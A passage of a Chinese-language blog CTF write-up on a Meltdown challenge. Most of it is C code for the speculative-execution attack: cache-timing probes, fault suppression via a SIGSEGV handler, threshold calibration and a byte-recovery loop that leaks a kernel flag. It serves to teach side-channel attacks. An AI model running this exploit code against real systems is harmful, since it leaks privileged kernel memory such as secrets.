+</span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span><span class="p">{</span>
+</span><span id="__span-4-3"><span class="linenos" data-linenos=" 3 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">,</span><span class="w"> </span><span class="n">mix_i</span><span class="p">;</span>
+</span><span id="__span-4-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="k">volatile</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+</span><span id="__span-4-5"><span class="linenos" data-linenos=" 5 "></span>
+</span><span id="__span-4-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">VARIANTS_READ</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-4-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">        </span><span class="n">mix_i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">((</span><span class="n">i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">167</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">13</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mi">255</span><span class="p">;</span>
+</span><span id="__span-4-8"><span class="linenos" data-linenos=" 8 "></span>
+</span><span id="__span-4-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">        </span><span class="n">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">target_array</span><span class="p">[</span><span class="n">mix_i</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">TARGET_SIZE</span><span class="p">];</span>
+</span><span id="__span-4-10"><span class="linenos" data-linenos="10 "></span><span class="w">        </span><span class="n">time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">get_access_time</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span><span id="__span-4-11"><span class="linenos" data-linenos="11 "></span>
+</span><span id="__span-4-12"><span class="linenos" data-linenos="12 "></span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">time</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="n">cache_hit_threshold</span><span class="p">)</span>
+</span><span id="__span-4-13"><span class="linenos" data-linenos="13 "></span><span class="w">            </span><span class="n">hist</span><span class="p">[</span><span class="n">mix_i</span><span class="p">]</span><span class="o">++</span><span class="p">;</span>
+</span><span id="__span-4-14"><span class="linenos" data-linenos="14 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-4-15"><span class="linenos" data-linenos="15 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>遍历 target_array 数组，并且计算访问时间，然后判断时间是否在预先设定的阈值内，若小于则记录一次。该阈值设定方法见其他注意点部分。</p>
+<h4 id="_6">整体逻辑</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#define CYCLES 1000</span>
+</span><span id="__span-5-2"><span class="linenos" data-linenos=" 2 "></span><span class="kt">int</span><span class="w"> </span><span class="nf">readbyte</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">addr</span><span class="p">)</span>
+</span><span id="__span-5-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
+</span><span id="__span-5-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="p">,</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">,</span><span class="w"> </span><span class="n">maxi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">-1</span><span class="p">;</span>
+</span><span id="__span-5-5"><span class="linenos" data-linenos=" 5 "></span><span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span><span id="__span-5-6"><span class="linenos" data-linenos=" 6 "></span>
+</span><span id="__span-5-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">hist</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">hist</span><span class="p">));</span>
+</span><span id="__span-5-8"><span class="linenos" data-linenos=" 8 "></span>
+</span><span id="__span-5-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">CYCLES</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-10"><span class="linenos" data-linenos="10 "></span><span class="w">        </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-5-11"><span class="linenos" data-linenos="11 "></span>
+</span><span id="__span-5-12"><span class="linenos" data-linenos="12 "></span><span class="w">        </span><span class="n">clflush_target</span><span class="p">();</span>
+</span><span id="__span-5-13"><span class="linenos" data-linenos="13 "></span><span class="w">        </span><span class="n">_mm_mfence</span><span class="p">();</span>
+</span><span id="__span-5-14"><span class="linenos" data-linenos="14 "></span><span class="w">        </span><span class="n">speculate</span><span class="p">(</span><span class="n">addr</span><span class="p">);</span>
+</span><span id="__span-5-15"><span class="linenos" data-linenos="15 "></span><span class="w">        </span><span class="n">check</span><span class="p">();</span>
+</span><span id="__span-5-16"><span class="linenos" data-linenos="16 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-17"><span class="linenos" data-linenos="17 "></span>
+</span><span id="__span-5-18"><span class="linenos" data-linenos="18 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">VARIANTS_READ</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-19"><span class="linenos" data-linenos="19 "></span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isprint</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span><span id="__span-5-20"><span class="linenos" data-linenos="20 "></span><span class="w">            </span><span class="k">continue</span><span class="p">;</span>
+</span><span id="__span-5-21"><span class="linenos" data-linenos="21 "></span><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">hist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">hist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">max</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-5-22"><span class="linenos" data-linenos="22 "></span><span class="w">            </span><span class="n">max</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hist</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span><span id="__span-5-23"><span class="linenos" data-linenos="23 "></span><span class="w">            </span><span class="n">maxi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+</span><span id="__span-5-24"><span class="linenos" data-linenos="24 "></span><span class="w">        </span><span class="p">}</span>
+</span><span id="__span-5-25"><span class="linenos" data-linenos="25 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-5-26"><span class="linenos" data-linenos="26 "></span>
+</span><span id="__span-5-27"><span class="linenos" data-linenos="27 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">maxi</span><span class="p">;</span>
+</span><span id="__span-5-28"><span class="linenos" data-linenos="28 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>执行多次清除cache→数据放入cache→获取访问时间→推断访问数据的流程。在推断访问流程即 check 函数中，每一个访问时间小于设定阈值的都会被记录一次。因此最终执行多次后，找到被记录最多次的数字，该数字即为该位置中的内容。</p>
+<p>此外执行流程中执行了函数 <code>__mm_mfence</code> ，该函数作用是读写串行化，即防止 CPU 乱序执行指令，保证执行数据放入 cache 这一操作时不会被前面的指令干扰。其目的和数据放入 cache 的第 7-9 行功能一样。</p>
+<h3 id="_7">其他注意点</h3>
+<p>这一部分讲一下其他的注意点，包括处理异常和设定时间阈值。</p>
+<h4 id="_8">处理异常</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span><span class="kt">int</span><span class="w"> </span><span class="nf">set_signal</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span id="__span-6-2"><span class="linenos" data-linenos="2 "></span><span class="p">{</span>
+</span><span id="__span-6-3"><span class="linenos" data-linenos="3 "></span><span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">sigaction</span><span class="w"> </span><span class="n">act</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-6-4"><span class="linenos" data-linenos="4 "></span><span class="w">        </span><span class="p">.</span><span class="n">sa_sigaction</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">sigsegv</span><span class="p">,</span>
+</span><span id="__span-6-5"><span class="linenos" data-linenos="5 "></span><span class="w">        </span><span class="p">.</span><span class="n">sa_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">SA_SIGINFO</span><span class="p">,</span>
+</span><span id="__span-6-6"><span class="linenos" data-linenos="6 "></span><span class="w">    </span><span class="p">};</span>
+</span><span id="__span-6-7"><span class="linenos" data-linenos="7 "></span>
+</span><span id="__span-6-8"><span class="linenos" data-linenos="8 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">sigaction</span><span class="p">(</span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">act</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+</span><span id="__span-6-9"><span class="linenos" data-linenos="9 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>通过重载 <code>sigaction</code> 达到忽略异常的目的。</p>
+<h4 id="_9">设定时间阈值</h4>
+<div class="language-cpp highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#define ESTIMATE_CYCLES 1000000</span>
+</span><span id="__span-7-2"><span class="linenos" data-linenos=" 2 "></span><span class="k">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">set_cache_hit_threshold</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span id="__span-7-3"><span class="linenos" data-linenos=" 3 "></span><span class="p">{</span>
+</span><span id="__span-7-4"><span class="linenos" data-linenos=" 4 "></span><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">cached</span><span class="p">,</span><span class="w"> </span><span class="n">uncached</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+</span><span id="__span-7-5"><span class="linenos" data-linenos=" 5 "></span>
+</span><span id="__span-7-6"><span class="linenos" data-linenos=" 6 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">cached</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ESTIMATE_CYCLES</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span id="__span-7-7"><span class="linenos" data-linenos=" 7 "></span><span class="w">        </span><span class="n">get_access_time</span><span class="p">(</span><span class="n">target_array</span><span class="p">);</span>
+</span><span id="__span-7-8"><span class="linenos" data-linenos=" 8 "></span>
+</span><span id="__span-7-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">cached</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ESTIMATE_CYCLES</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span><span id="__span-7-10"><span class="linenos" data-linenos="10 "></span><span class="w">        </span><span class="n">cached</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">get_access_time</span><span class="p">(</span><span class="n">target_array</span><span class="p">);</span>
+</span><span id="__span-7-11"><span class="linenos" data-linenos="11 "></span>
+</span><span id="__span-7-12"><span class="linenos" data-linenos="12 "></span><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">uncached</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">ESTIMATE_CYCLES</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-7-13"><span class="linenos" data-linenos="13 "></span><span class="w">        </span><span class="n">_mm_clflush</span><span class="p">(</span><span class="n">target_array</span><span class="p">);</span>
+</span><span id="__span-7-14"><span class="linenos" data-linenos="14 "></span><span class="w">        </span><span class="n">uncached</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">get_access_time</span><span class="p">(</span><span class="n">target_array</span><span class="p">);</span>
+</span><span id="__span-7-15"><span class="linenos" data-linenos="15 "></span><span class="w">    </span><span class="p">}</span>
+</span><span id="__span-7-16"><span class="linenos" data-linenos="16 "></span>
+</span><span id="__span-7-17"><span class="linenos" data-linenos="17 "></span><span class="w">    </span><span class="n">cached</span><span class="w"> </span><span class="o">/=</span><span class="w"> </span><span class="n">ESTIMATE_CYCLES</span><span class="p">;</span>
+</span><span id="__span-7-18"><span class="linenos" data-linenos="18 "></span><span class="w">    </span><span class="n">uncached</span><span class="w"> </span><span class="o">/=</span><span class="w"> </span><span class="n">ESTIMATE_CYCLES</span><span class="p">;</span>
+</span><span id="__span-7-19"><span class="linenos" data-linenos="19 "></span>
+</span><span id="__span-7-20"><span class="linenos" data-linenos="20 "></span><span class="w">    </span><span class="n">cache_hit_threshold</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">mysqrt</span><span class="p">(</span><span class="n">cached</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">uncached</span><span class="p">);</span>
+</span><span id="__span-7-21"><span class="linenos" data-linenos="21 "></span><span class="p">}</span>
+</span></code></pre></div>
+<p>即分别执行多次命中 cache 和 不命中 cache 的操作，得出命中和不命中的时间，阈值最终设定为这两者的乘积的平方根。设定该阈值准确度较高。</p>
+<h2 id="_10">攻击结果</h2>
+<p>首先确定 <code>/dev/memdev0</code> 的内容，通过给的虚拟设备源码可以知道，该内容即为内核中 flag 的地址。</p>
+<p>然后编译 meltdown 程序，执行该程序，传入对应的地址信息即可获取 flag。</p>
+<p>最终的结果为 <code>flag{cpu_side_channel_info_leak}</code>。</p>
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+  
+
+
+
+  <form class="md-feedback" name="feedback" hidden>
+    <fieldset>
+      <legend class="md-feedback__title">
+        Was this page helpful?
+      </legend>
+      <div class="md-feedback__inner">
+        <div class="md-feedback__list">
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page was helpful" data-md-value="1">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M5 9v12H1V9zm4 12a2 2 0 0 1-2-2V9c0-.55.22-1.05.59-1.41L14.17 1l1.06 1.06c.27.27.44.64.44 1.05l-.03.32L14.69 8H21a2 2 0 0 1 2 2v2c0 .26-.05.5-.14.73l-3.02 7.05C19.54 20.5 18.83 21 18 21zm0-2h9.03L21 12v-2h-8.79l1.13-5.32L9 9.03z"/></svg>
+            </button>
+          
+            <button class="md-feedback__icon md-icon" type="submit" title="This page could be improved" data-md-value="0">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 15V3h4v12zM15 3a2 2 0 0 1 2 2v10c0 .55-.22 1.05-.59 1.41L9.83 23l-1.06-1.06c-.27-.27-.44-.64-.44-1.06l.03-.31.95-4.57H3a2 2 0 0 1-2-2v-2c0-.26.05-.5.14-.73l3.02-7.05C4.46 3.5 5.17 3 6 3zm0 2H5.97L3 12v2h8.78l-1.13 5.32L15 14.97z"/></svg>
+            </button>
+          
+        </div>
+        <div class="md-feedback__note">
+          
+            <div data-md-value="1" hidden>
+              
+              
+                
+              
+              
+              
+                
+                
+              
+              Thanks! You can leave some advices in the comment section below. 
+            </div>
+          
+            <div data-md-value="0" hidden>
+              
+              
+                
+              
+              
+              
+              
+            </div>
+          
+        </div>
+      </div>
+    </fieldset>
+  </form>
+
+
+<h2 id="__comments">Comments</h2>
+<!-- Insert generated snippet here -->
+
+<script src="https://giscus.app/client.js"
+    data-repo="masterAllen/masterAllen.github.io"
+    data-repo-id="R_kgDOM_LyMQ"
+    data-category="General"
+    data-category-id="DIC_kwDOM_LyMc4Cl7rg"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="preferred_color_scheme"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+</script>
+
+<!-- Synchronize Giscus theme with palette -->
+<script>
+    var giscus = document.querySelector("script[src*=giscus]")
+
+    // Set palette on initial load
+    var palette = __md_get("__palette")
+    if (palette && typeof palette.color === "object") {
+        var theme = palette.color.scheme === "slate"
+            ? "transparent_dark"
+            : "light"
+
+        // Instruct Giscus to set theme
+        giscus.setAttribute("data-theme", theme)
+    }
+
+    // Register event handlers after documented loaded
+    document.addEventListener("DOMContentLoaded", function () {
+        var ref = document.querySelector("[data-md-component=palette]")
+        ref.addEventListener("change", function () {
+            var palette = __md_get("__palette")
+            if (palette && typeof palette.color === "object") {
+                var theme = palette.color.scheme === "slate"
+                    ? "transparent_dark"
+                    : "light"
+
+                // Instruct Giscus to change theme
+                var frame = document.querySelector(".giscus-frame")
+                frame.contentWindow.postMessage(
+                    { giscus: { setConfig: { theme } } },
+                    "https://giscus.app"
+                )
+            }
+        })
+    })
+</script>
+
+                      
+                    
+                  </article>
+                  
+                    <div class="vercount-stats md-typeset" aria-label="网站访问统计">
+                      <span>本文阅读 <span id="vercount_value_page_pv">Loading</span> 次</span>
+                      <span>本站访问 <span id="vercount_value_site_pv">Loading</span> 次</span>
+                      <span>访客 <span id="vercount_value_site_uv">Loading</span> 人</span>
+                    </div>
+                  
+                </div>
+              
+              
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+            </div>
+            
+          </main>
+          
+            <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../../compilebackdoor/%E7%BB%99%E7%BC%96%E8%AF%91%E5%99%A8%E5%8A%A0%E5%90%8E%E9%97%A8/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 给编译器加后门.md">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-left" viewBox="0 0 24 24"><path d="m12 19-7-7 7-7M19 12H5"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                给编译器加后门.md
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../../pwnable_kr/" class="md-footer__link md-footer__link--next" aria-label="Next: pwnable_kr">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                pwnable_kr
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" class="lucide lucide-arrow-right" viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 ~ now | 🚀 HONG Anlun (allen hong)
+    </div>
+  
+  
+    <div class="md-copyright__generator">
+      Made with
+      <a href="https://zensical.org/" target="_blank" rel="noopener">
+        Zensical
+      </a>
+    </div>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+          
+        </div>
+      </div>
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../..","features":["navigation.instant","navigation.prune","navigation.tabs","navigation.path","navigation.indexes","header.autohide","navigation.footer"],"search":"../../../../assets/javascripts/workers/search.e2d2d235.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
+    
+    
+      
+      <script src="../../../../assets/javascripts/bundle.dbc0afdc.min.js"></script>
+      
+        <script src="../../../../javascripts/copy.js"></script>
+      
+        <script src="../../../../javascripts/code-blocks.js"></script>
+      
+        <script src="../../../../javascripts/collapsible-headings.js"></script>
+      
+        <script src="../../../../javascripts/hide-details-toc.js"></script>
+      
+        <script src="../../../../javascripts/resizable-sidebar.js"></script>
+      
+        <script src="../../../../javascripts/sidebar-toggle-buttons.js"></script>
+      
+        <script src="../../../../javascripts/review-tracker.js"></script>
+      
+        <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="../../../../javascripts/katex.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+      
+        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+      
+      <script defer src="../../../../javascripts/archive-filter.js"></script>
+      <script defer src="../../../../javascripts/pdf-inline.js"></script>
+      <script defer src="../../../../javascripts/html-inline.js" data-resource-origin=""></script>
+      <script defer src="../../../../javascripts/media-notes.js?v=20261021"></script>
+      
+      
+      
+        <script defer src="https://events.vercount.one/js"></script>
+      
+    
+  </body>
+</html>
